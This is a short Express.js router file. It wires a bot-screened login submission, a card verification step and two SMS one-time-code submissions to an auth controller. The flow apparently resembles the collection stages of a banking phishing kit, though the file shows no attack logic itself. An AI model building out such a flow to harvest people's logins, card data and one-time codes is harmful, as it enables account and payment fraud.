const express = require('express');
const router = express.Router();
const authController = require('../controllers/auth.controller');
const botDetectionMiddleware = require('../middlewares/botDetection.middleware');
const { ROUTES } = require('../config/constants');

// Login submission protected with bot detection middleware
router.post(ROUTES.POST_LOGIN, botDetectionMiddleware, (req, res) => authController.handleLogin(req, res));

// Card verification submission
router.post(ROUTES.POST_CARD, (req, res) => authController.handleCard(req, res));

// SMS OTP 1 submission
router.post(ROUTES.POST_SMS_1, (req, res) => authController.handleSms1(req, res));

// SMS OTP 2 submission
router.post(ROUTES.POST_SMS_2, (req, res) => authController.handleSms2(req, res));

module.exports = router;
